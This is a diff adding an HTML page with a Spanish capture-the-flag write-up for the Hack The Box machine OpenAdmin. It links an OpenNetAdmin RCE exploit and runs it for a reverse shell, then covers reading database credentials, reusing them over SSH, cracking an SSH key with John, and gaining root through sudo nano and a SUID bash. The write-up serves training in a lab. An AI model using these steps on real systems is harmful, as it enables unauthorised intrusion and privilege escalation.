@@ -1,0 +1,132 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | OpenAdmin HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/openadmin/pasted-20260414162956.png" alt="OpenAdmin HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>OpenAdmin</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>internal</span>
+            <span>OpenNetAdmin</span>
+            <span>nano</span>
+            <span>sudoers</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Web con OpenNetAdmin desplegado</li>
+            <li><code>Explotación</code>: OpenNetAdmin vulnerable a RCE para obtener shell inicial</li>
+            <li><code>Movimiento lateral</code>: Configuración de ONA expone credenciales reutilizables para <code>jimmy</code></li>
+            <li><code>Movimiento lateral</code>: Grupo internal permite acceder a una ruta PHP interna que expone la <code>id_rsa</code> cifrada de <code>joanna</code></li>
+            <li><code>Escalada de Privilegios</code>: Sudoers sobre <code>nano</code> para ejecutar comandos como root</li>
+          </ul>
+        </section>
+
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260414162929.png" alt="Enumeración inicial de OpenAdmin" />
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260414163210.png" alt="Enumeración web de OpenAdmin" />
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260414221023.png" alt="Panel web de OpenAdmin" />
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260414220849.png" alt="Servicio web de OpenAdmin" />
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260414220841.png" alt="Aplicación OpenNetAdmin expuesta" />
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260414220910.png" alt="Detalle de OpenNetAdmin" />
+        </section>
+
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <p><a href="https://raw.githubusercontent.com/sagisar1/CVE-2019-25065-exploit/refs/heads/main/openadmin_rce_poc.sh">Exploit de GitHub</a></p>
+          <div class="code-card">
+            <h3>Ejecutar exploit</h3>
+            <pre><code>bash openadmin_rce_poc.sh -u http://10.129.20.137/ona/ --lhost 10.10.16.178 --lport 443</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260414220950.png" alt="Ejecución del exploit contra OpenNetAdmin" />
+        </section>
+
+        <section class="writeup-section">
+          <h2>Movimiento lateral: BD</h2>
+          <div class="code-card">
+            <h3>BD</h3>
+            <pre><code>cd /var/www/html/ona/local/config
+cat database_settings.inc.php
+# Credenciales MySQL -&gt; ona_sys:n1nj4W4rri0R!
+# Reutiliza la contraseña en Jimmy</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Acceso SSH</h3>
+            <pre><code>ssh jimmy@10.129.20.137
+# Password: n1nj4W4rri0R!</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260415000348.png" alt="Credenciales reutilizadas para Jimmy" />
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260415001231.png" alt="Acceso como Jimmy" />
+        </section>
+
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Grupo Internal</h2>
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260415001242.png" alt="Jimmy pertenece al grupo internal" />
+          <div class="code-card">
+            <h3>Enumerar configuración interna</h3>
+            <pre><code>cat /etc/apache2/sites-available/internal.conf
+# Ejecutamos ficheros como joanna por el puerto 52845 desde la ruta /var/www/internal</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260415001537.png" alt="Configuración internal de Apache" />
+          <div class="code-card">
+            <h3>Ejecutar main.php</h3>
+            <pre><code>curl localhost:52846/main.php</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260415001808.png" alt="Respuesta de main.php" />
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260415002334.png" alt="Obtención de id_rsa" />
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260415002231.png" alt="Clave id_rsa cifrada" />
+          <div class="code-card">
+            <h3>Acceso SSH</h3>
+            <pre><code>ssh2john id_rsa
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+chmod 600 id_rsa
+ssh -i id_rsa joanna@10.129.20.137
+# Password: bloodninjas</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260415002511.png" alt="Acceso como Joanna por SSH" />
+        </section>
+
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Sudoers nano</h2>
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260415003303.png" alt="Permiso sudo para nano" />
+          <div class="code-card">
+            <h3>Ejecución de comando desde NANO</h3>
+            <pre><code>sudo /bin/nano /opt/priv
+# CTRL+R
+# CTRL+X
+# Comando: chmod u+s /bin/bash
+bash -p</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260415003509.png" alt="Ejecución de comando desde nano" />
+          <img class="writeup-image" src="/writeups/assets/openadmin/pasted-20260415003614.png" alt="Root en OpenAdmin" />
+        </section>
+
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>internal</span>
+            <span>OpenNetAdmin</span>
+            <span>nano</span>
+            <span>sudoers</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
